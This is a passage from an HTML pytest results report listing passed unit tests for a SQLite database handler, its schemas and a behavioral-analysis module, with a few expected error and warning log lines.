          <td class="col-name">tests/unit/test_sqlite_handler.py::TestSQLiteHandler::test_init</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="empty log">No log output captured.</div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/unit/test_sqlite_handler.py::TestSQLiteHandler::test_get_user_profiles_table</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="empty log">No log output captured.</div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/unit/test_sqlite_handler.py::TestSQLiteHandler::test_get_subscriptions_table</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="empty log">No log output captured.</div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/unit/test_sqlite_handler.py::TestSQLiteHandler::test_initialize_tables_success</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="empty log">No log output captured.</div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/unit/test_sqlite_handler.py::TestSQLiteHandler::test_initialize_tables_error</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="log"> -------------------------------Captured log call-------------------------------- <br/>ERROR    src.database.sqlite:sqlite.py:66 Error initializing SQLite tables: Test error<br/></div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/unit/test_sqlite_handler.py::TestSQLiteHandler::test_execute_query</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="empty log">No log output captured.</div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/unit/test_sqlite_handler.py::TestSQLiteHandler::test_execute_query_with_params</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="empty log">No log output captured.</div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/unit/test_sqlite_handler.py::TestSQLiteHandler::test_execute_update</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="empty log">No log output captured.</div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/unit/test_sqlite_handler.py::TestSQLiteHandler::test_execute_update_with_params</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="empty log">No log output captured.</div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/unit/test_sqlite_schemas.py::TestSQLiteSchemas::test_get_user_profiles_schema</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="empty log">No log output captured.</div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/unit/test_sqlite_schemas.py::TestSQLiteSchemas::test_get_subscriptions_schema</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="empty log">No log output captured.</div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/unit/test_sqlite_schemas.py::TestSQLiteSchemas::test_get_user_profiles_indexes</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="empty log">No log output captured.</div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/unit/test_sqlite_schemas.py::TestSQLiteSchemas::test_get_subscriptions_indexes</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="empty log">No log output captured.</div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/unit/test_sqlite_schemas.py::TestSQLiteSchemas::test_initialize_database_success</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="empty log">No log output captured.</div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/unit/test_sqlite_schemas.py::TestSQLiteSchemas::test_initialize_database_error</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="log"> -------------------------------Captured log call-------------------------------- <br/>ERROR    src.database.schemas.sqlite:sqlite.py:122 Error initializing SQLite database: Test error<br/></div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/unit/emotional/test_behavioral_analysis.py::test_analyze_response_timing</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="log"> -------------------------------Captured log call-------------------------------- <br/>WARNING  src.modules.emotional.behavioral_analysis:behavioral_analysis.py:60 &#x27;response_time_seconds&#x27; not found in response_data.<br/></div></td></tr></tbody></table></body></html>